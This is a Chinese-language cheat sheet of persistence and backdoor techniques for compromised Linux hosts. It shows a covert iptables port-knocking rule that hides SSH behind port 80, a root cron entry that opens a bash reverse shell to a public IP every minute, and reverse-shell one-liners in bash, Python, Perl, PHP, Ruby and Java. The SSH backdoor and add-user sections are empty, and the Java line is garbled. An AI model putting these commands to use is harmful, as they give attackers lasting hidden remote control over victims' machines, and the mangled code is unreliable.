## 端口复用

### sslh

```bash
# 安装SSLH
sudo apt-get install sslh
# 配置SSLH
编辑 SSLH 配置文件：
sudo vi /etc/default/sslh
 
# 1、找到下列行：Run=no  将其修改为：Run=yes
# 2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443
DAEMON_OPTS="--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid"
```

### iptables

```bash
# 端口复用链
iptables -t nat -N LETMEIN
# 端口复用规则
iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22
# 开启开关
iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
# 关闭开关
iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
# let's do it
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN

#开启复用
echo threathuntercoming | socat - tcp:192.168.28.128:80
#ssh使用80端口进行登录
ssh -p 80 root@192.168.28.128
#关闭复用
echo threathunterleaving | socat - tcp:192.168.28.128:80
```

## 计划任务

```bash
echo '* * * * * bash -i >& /dev/tcp/114.215.27.76/9998 0>&1' >> /var/spool/cron/root
```

### 反弹shell

```bash

echo '* * * * * bash -i >& /dev/tcp/114.215.27.76/9998 0>&1' >> /var/spool/cron/root



#bash反弹
bash -i >& /dev/tcp/192.168.10.27/4444 0>&1
# sh情况
/bin/bash -c "bash -i >& /dev/tcp/114.215.27.76/9997 0>&1"

#python反弹
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

#Perl反弹
perl -e 'use Socket;$i="114.215.27.76";$p=9998;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#PHP反弹
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3>&3 2>&3");'

#Ruby反弹
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'

#Java反弹
r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[]) p.waitFor()

```

##  ssh后门

## 添加用户

```
	
```

